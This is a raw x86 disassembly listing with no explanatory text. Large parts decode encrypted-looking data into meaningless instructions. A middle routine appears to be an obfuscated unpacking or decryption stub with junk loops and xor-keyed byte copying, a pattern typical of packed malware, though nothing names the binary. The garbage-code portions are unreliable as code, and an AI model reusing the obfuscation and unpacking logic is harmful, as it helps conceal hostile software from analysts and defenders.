  4039ba:	imul   edi,ebx,0xc3e3d5ff
  4039c0:	fcomp  QWORD PTR [eax+ebp*4-0x7b]
  4039c4:	mov    dh,0x83
  4039c6:	or     DWORD PTR [edx],edx
  4039c8:	push   0xffffffb3
  4039ca:	aam    0x71
  4039cc:	mov    ah,0x27
  4039ce:	adc    DWORD PTR [esi+esi*4+0x36],ebp
  4039d2:	out    0xd6,eax
  4039d4:	ins    DWORD PTR es:[edi],dx
  4039d5:	jmp    0xa8b6059d
  4039da:	add    DWORD PTR [ebx-0x14],edi
  4039dd:	into   
  4039de:	ret    
  4039df:	xchg   esp,eax
  4039e0:	out    0x4f,eax
  4039e2:	daa    
  4039e3:	jg     0x403a5c
  4039e5:	inc    eax
  4039e6:	jns    0x40396c
  4039e8:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4039ea:	sub    eax,DWORD PTR [ebp-0x4]
  4039ed:	cmc    
  4039ee:	push   ecx
  4039ef:	mov    DWORD PTR [ebp-0x25],esi
  4039f2:	daa    
  4039f3:	adc    ecx,DWORD PTR [ebx-0x2c954a25]
  4039f9:	add    bl,ch
  4039fb:	jae    0x4039b1
  4039fd:	dec    ecx
  4039fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039ff:	pop    ebx
  403a00:	rcr    DWORD PTR [ebx-0xa],cl
  403a03:	mov    dl,0x38
  403a05:	inc    ebx
  403a06:	push   ebx
  403a07:	imul   esp,ebp,0xe32cbd8f
  403a0d:	stos   DWORD PTR es:[edi],eax
  403a0e:	(bad)  
  403a0f:	pop    ds
  403a10:	out    0x7f,eax
  403a12:	xchg   al,al
  403a14:	hlt    
  403a15:	sahf   
  403a16:	rcl    BYTE PTR [edi+0x6a],1
  403a19:	shl    DWORD PTR [edx-0x60],0x33
  403a1d:	pop    es
  403a1e:	jns    0x4039a8
  403a20:	push   ds
  403a21:	dec    ebx
  403a22:	pop    ebp
  403a23:	arpl   si,bp
  403a25:	or     DWORD PTR [esi-0x1851a05a],0xffffff95
  403a2c:	pop    edi
  403a2d:	mov    edx,0xdbf43b24
  403a32:	stos   BYTE PTR es:[edi],al
  403a33:	mov    ds:0xc3b75e65,eax
  403a38:	xor    esi,DWORD PTR [edx]
  403a3a:	mov    al,ds:0xbafb3d6b
  403a3f:	enter  0x5134,0xca
  403a43:	adc    esi,DWORD PTR [edi+eax*4]
  403a46:	mov    ecx,0xe4d1303
  403a4b:	mov    eax,0x2ef64b54
  403a50:	adc    BYTE PTR [eax+0x46a5faab],bh
  403a56:	popf   
  403a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a58:	dec    ebp
  403a59:	jmp    0x7762:0xb332a897
  403a60:	xchg   BYTE PTR [esi-0x18b12a58],al
  403a66:	sub    al,0xa9
  403a68:	adc    DWORD PTR [ebx+0x56c4cade],0xb107582a
  403a72:	out    dx,al
  403a73:	out    0x4f,al
  403a75:	push   ds
  403a76:	jle    0x403ae7
  403a78:	data16 xor al,dl
  403a7b:	adc    eax,0x1c4436b9
  403a80:	sbb    ah,BYTE PTR [esp+ecx*1]
  403a83:	call   0x55b4f0
  403a88:	inc    esi
  403a89:	stos   BYTE PTR es:[edi],al
  403a8a:	xchg   DWORD PTR ds:0xd98a8a05,edx
  403a90:	in     al,dx
  403a91:	pop    ds
  403a92:	or     al,0x5f
  403a94:	mov    dh,0x50
  403a96:	pop    edx
  403a97:	xor    eax,0x769f141d
  403a9c:	in     eax,0xa7
  403a9e:	add    DWORD PTR [ebp-0x535da4f9],eax
  403aa4:	nop
  403aa5:	xor    DWORD PTR [edi],0xeab2ae98
  403aab:	cmp    al,BYTE PTR [edi-0x76]
  403aae:	aaa    
  403aaf:	test   eax,0x6e8a29c2
  403ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ab5:	and    ch,BYTE PTR [edi+0x39595cb2]
  403abb:	pop    ss
  403abc:	bswap  ebp
  403abe:	(bad)  
  403abf:	mov    dh,cl
  403ac1:	jo     0x403ad8
  403ac3:	sub    ecx,ebp
  403ac5:	sti    
  403ac6:	push   edi
  403ac7:	adc    bh,BYTE PTR ss:[edx]
  403aca:	adc    BYTE PTR [edx],0x81
  403acd:	jecxz  0x403adc
  403acf:	rol    BYTE PTR [esp+ebp*4],0xde
  403ad3:	arpl   WORD PTR [ebx+0xe],cx
  403ad6:	sbb    BYTE PTR [esi],ch
  403ad8:	inc    edx
  403ad9:	sbb    DWORD PTR [edi],ecx
  403adb:	pop    ebp
  403adc:	adc    al,0xb4
  403ade:	dec    ecx
  403adf:	popf   
  403ae0:	call   0xebe83a73
  403ae5:	int    0xc2
  403ae7:	jg     0x403b2d
  403ae9:	fsubr  DWORD PTR [edi+0x5b85bfd8]
  403aef:	ror    DWORD PTR [edi-0x4f],1
  403af2:	cs hlt 
  403af4:	adc    ah,dh
  403af6:	stos   BYTE PTR es:[edi],al
  403af7:	mov    bl,0x3c
  403af9:	sbb    eax,0xc34f10c4
  403afe:	sub    dx,WORD PTR [edi]
  403b01:	add    DWORD PTR [eax-0xc],esi
  403b04:	in     eax,0xd7
  403b06:	mov    eax,0xc65d723d
  403b0b:	xor    eax,0xf70a5706
  403b10:	leave  
  403b11:	lods   eax,DWORD PTR ds:[esi]
  403b12:	pop    ss
  403b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b14:	xor    eax,0x64f46f86
  403b19:	add    DWORD PTR [edi+0x26],edi
  403b1c:	shr    DWORD PTR [eax+0xf],cl
  403b1f:	out    0x4,al
  403b21:	xchg   edx,eax
  403b22:	mov    ecx,0xc949142c
  403b27:	loope  0x403b20
  403b29:	ss inc edi
  403b2b:	and    cl,ah
  403b2d:	mov    bh,0x5a
  403b2f:	push   ds
  403b30:	dec    edx
  403b31:	aad    0xf1
  403b33:	inc    ebp
  403b34:	dec    BYTE PTR [eax-0x61c2a0b9]
  403b3a:	add    DWORD PTR [ecx+0x54],0x42
  403b3e:	sbb    ebp,edi
  403b40:	and    eax,0x329e9574
  403b45:	clc    
  403b46:	mov    cs,WORD PTR [ebx-0x16]
  403b49:	sar    DWORD PTR [esi-0x32d48758],1
  403b4f:	mov    fs:0xf372c361,al
  403b55:	mov    ah,0x97
  403b57:	lods   eax,DWORD PTR ds:[esi]
  403b58:	sub    esi,DWORD PTR [eax-0x5f938b13]
  403b5e:	shl    al,1
  403b60:	repnz sti 
  403b62:	or     ah,ch
  403b64:	mov    ebx,esi
  403b66:	div    DWORD PTR [edi+0x18f3fbe]
  403b6c:	fsub   QWORD PTR [edi+0x0]
  403b6f:	jae    0x403b7d
  403b71:	xchg   ecx,eax
  403b72:	xchg   ebx,eax
  403b73:	repnz test eax,eax
  403b76:	push   ebx
  403b77:	idiv   DWORD PTR [edi]
  403b79:	lods   al,BYTE PTR ds:[esi]
  403b7a:	fwait
  403b7b:	sub    al,0x12
  403b7d:	lods   al,BYTE PTR ds:[esi]
  403b7e:	loop   0x403b05
  403b80:	cmp    dl,cl
  403b82:	mov    al,ds:0x7ac6286b
  403b87:	in     al,0x30
  403b89:	nop
  403b8a:	xor    BYTE PTR [eiz*2-0x178e36bb],dh
  403b91:	lods   eax,DWORD PTR ds:[esi]
  403b92:	lods   al,BYTE PTR ds:[esi]
  403b93:	adc    BYTE PTR [ebx+0x21797d65],ch
  403b99:	ja     0x403b7f
  403b9b:	mov    bl,0x42
  403b9d:	shl    eax,0xc2
  403ba0:	pop    edx
  403ba1:	test   eax,0x8a40e280
  403ba6:	ror    BYTE PTR [ecx+0x34d8120f],1
  403bac:	jnp    0x403b5a
  403bae:	stc    
  403baf:	or     al,0xec
  403bb1:	imul   ecx,ebp,0x5875f5c9
  403bb7:	mov    ch,0x76
  403bb9:	dec    ecx
  403bba:	(bad)  [eax+ebp*8]
  403bbd:	and    BYTE PTR [ebp-0x1e5519f],bl
  403bc3:	push   ebx
  403bc4:	aad    0xbb
  403bc6:	jg     0x403c37
  403bc8:	mov    ah,BYTE PTR [esi]
  403bca:	pop    edi
  403bcb:	xor    al,0xf9
  403bcd:	add    al,0x96
  403bcf:	mov    bh,BYTE PTR [ecx+0x402c4e9f]
  403bd5:	popf   
  403bd6:	xchg   edi,eax
  403bd7:	jecxz  0x403c57
  403bd9:	xchg   BYTE PTR [ecx-0x264abdb5],al
  403bdf:	icebp  
  403be0:	test   DWORD PTR [ebx],edi
  403be2:	add    eax,0xa805bd3f
  403be7:	xchg   esi,edx
  403be9:	leave  
  403bea:	cmp    eax,0x9d7d591b
  403bef:	add    BYTE PTR [edx-0x13],dl
  403bf2:	lahf   
  403bf3:	pusha  
  403bf4:	add    al,0x79
  403bf6:	inc    ebx
  403bf7:	add    bl,BYTE PTR [eax+0x66b2bb08]
  403bfd:	dec    ebp
  403bfe:	jo     0x403bc6
  403c00:	pop    eax
  403c01:	sub    BYTE PTR [edx+edi*1],0xa
  403c05:	add    al,0xa7
  403c07:	mov    dh,BYTE PTR [edx+0x4c08453]
  403c0d:	pop    es
  403c0e:	xor    ebp,0xc387510b
  403c14:	lods   eax,DWORD PTR ds:[esi]
  403c15:	dec    ebp
  403c16:	fimul  DWORD PTR [esi-0x30]
  403c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c1a:	mov    DWORD PTR [edi-0x13],ecx
  403c1d:	push   eax
  403c1e:	pop    ds
  403c1f:	dec    esi
  403c20:	rol    BYTE PTR [eax+eiz*2+0x10325f43],1
  403c27:	mov    edi,0x7043954d
  403c2c:	jne    0x403c34
  403c2e:	sub    al,0xf2
  403c30:	mov    dh,dl
  403c32:	mov    ebp,0x946961f2
  403c37:	aam    0x45
  403c39:	inc    edi
  403c3a:	test   DWORD PTR [esp+ebx*2+0xa9c58e7],edi
  403c41:	inc    esp
  403c42:	ins    BYTE PTR es:[edi],dx
  403c43:	jo     0x403c33
  403c45:	loop   0x403c31
  403c47:	add    BYTE PTR [edi],al
  403c49:	out    dx,al
  403c4a:	jg     0x403bd5
  403c4c:	cmp    esp,DWORD PTR [ecx+0x5b]
  403c4f:	or     al,0x84
  403c51:	stos   DWORD PTR es:[edi],eax
  403c52:	out    dx,al
  403c53:	add    al,0x94
  403c55:	xchg   ebx,eax
  403c56:	cld    
  403c57:	in     al,0xff
  403c59:	int    0x4a
  403c5b:	xor    eax,edx
  403c5d:	std    
  403c5e:	xor    eax,esp
  403c60:	mul    DWORD PTR [edi+0x52]
  403c63:	xchg   esp,eax
  403c64:	dec    ebx
  403c65:	rcr    ebx,cl
  403c67:	(bad)  
  403c68:	adc    eax,0x53b8a7ac
  403c6d:	shl    DWORD PTR [edx-0x3118c9c0],1
  403c73:	popf   
  403c74:	cld    
  403c75:	sbb    eax,0xde9c77c7
  403c7a:	sbb    eax,0xe899d15f
  403c7f:	push   edi
  403c80:	xor    ecx,eax
  403c82:	mov    DWORD PTR [ebp+0x8],ecx
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff1f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x429c947b
  4042a6:	mov    WORD PTR [esi+0x625f1a20],ss
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x55]
  4042b2:	mov    ebp,DWORD PTR [ebx+0x1dedb5e1]
  4042b8:	fcomp  st(4)
  4042ba:	jp     0x4042e4
  4042bc:	(bad)  
  4042bd:	xorps  xmm5,XMMWORD PTR [esi+0x4ce81233]
  4042c4:	pop    ds
  4042c5:	icebp  
  4042c6:	cmp    dh,cl
  4042c8:	(bad)  
  4042c9:	aam    0xf7
  4042cb:	jge    0x40431b
  4042cd:	out    0xd9,al
  4042cf:	pop    ebx
  4042d0:	jle    0x40425a
  4042d2:	daa    
  4042d3:	mov    bh,0xb6
  4042d5:	jo     0x4042f7
  4042d7:	xchg   esi,eax
  4042d8:	adc    DWORD PTR [ebx+edx*8-0x21],ebp
  4042dc:	pop    ds
  4042dd:	stc    
  4042de:	ss daa 
  4042e0:	cmp    BYTE PTR [esi+ebx*8],al
  4042e3:	add    BYTE PTR [edx+0x54],0x83
  4042e7:	push   ebx
  4042e8:	jecxz  0x404337
  4042ea:	cmp    BYTE PTR [esi+0x54c71439],bl
  4042f0:	pop    ss
  4042f1:	loop   0x40434d
  4042f3:	sub    al,0x11
  4042f5:	xor    eax,0x772737c6
  4042fa:	and    DWORD PTR [ebp+0x66],0x87e9d3a5
  404301:	in     eax,dx
  404302:	(bad)  
  404306:	mov    bl,0x7a
  404308:	popf   
  404309:	mov    al,ds:0xd2e18b28
  40430e:	jne    0x404373
  404310:	add    ch,al
  404312:	push   ecx
  404313:	js     0x4042bb
  404315:	xchg   edx,eax
  404316:	push   ds
  404317:	inc    edi
  404318:	cwde   
  404319:	sub    cl,BYTE PTR [edi]
  40431b:	sahf   
  40431c:	ret    
  40431d:	ds sbb eax,0xa6e37beb
  404323:	shl    BYTE PTR [edx+edi*8-0x17],0x4f
  404328:	pusha  
  404329:	ja     0x404397
  40432b:	jae    0x404312
  40432d:	fsubr  QWORD PTR [ebx]
  40432f:	xor    bh,al
  404331:	jge    0x4043ad
  404333:	test   DWORD PTR [eax],edi
  404335:	jmp    0x404327
  404337:	and    al,0x16
  404339:	dec    ecx
  40433a:	(bad)  
  40433b:	fidivr DWORD PTR [edx]
  40433d:	add    esi,DWORD PTR [edx]
  40433f:	js     0x40430d
  404341:	ror    BYTE PTR [edx-0x93f9c36],cl
  404347:	add    al,0xc
  404349:	aaa    
  40434a:	adc    DWORD PTR [edi+0x47],ecx
  40434d:	mov    ecx,0xb002043e
  404352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404353:	mov    ah,0xb1
  404355:	nop
  404356:	and    DWORD PTR [ebx-0x49c4b51b],eax
  40435c:	js     0x4042ea
  40435e:	or     dh,BYTE PTR [edx]
  404360:	adc    ch,BYTE PTR [ebp-0x5e]
  404363:	int    0x75
  404365:	cmp    dh,BYTE PTR [eax-0x37]
  404368:	loop   0x404338
  40436a:	loopne 0x404301
  40436c:	stc    
  40436d:	jne    0x4043a6
  40436f:	inc    eax
  404370:	std    
  404371:	or     edi,DWORD PTR [ebx]
  404373:	es pop edx
  404375:	outs   dx,BYTE PTR ds:[esi]
  404376:	push   edx
  404377:	pop    ebx
  404378:	std    
  404379:	scas   eax,DWORD PTR es:[edi]
  40437a:	sub    DWORD PTR [ebx-0x1e],edx
  40437d:	jg     0x4043a9
  40437f:	mov    ebp,0x3e8e9f01
  404384:	ins    DWORD PTR es:[edi],dx
  404385:	nop
  404386:	cmp    BYTE PTR [bx+si],0x79
  40438a:	mov    BYTE PTR [ebx-0x5f9344dc],0x19
  404391:	dec    edx
  404392:	or     eax,0xbe9b6e22
  404397:	mov    esi,0x289888f0
  40439c:	enter  0x634e,0xe7
  4043a0:	test   DWORD PTR [esi+0x6be689cd],esp
  4043a6:	jp     0x4043e7
  4043a8:	retf   0xfd55
  4043ab:	sub    eax,0x72841fde
  4043b0:	out    dx,eax
  4043b1:	or     BYTE PTR [esi-0x41a321d],0xff
  4043b8:	imul   ebx,DWORD PTR [esi+0x4a],0x9162d864
  4043bf:	dec    esp
  4043c0:	mov    DWORD PTR [ebx],ebx
  4043c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c3:	adc    al,0xe3
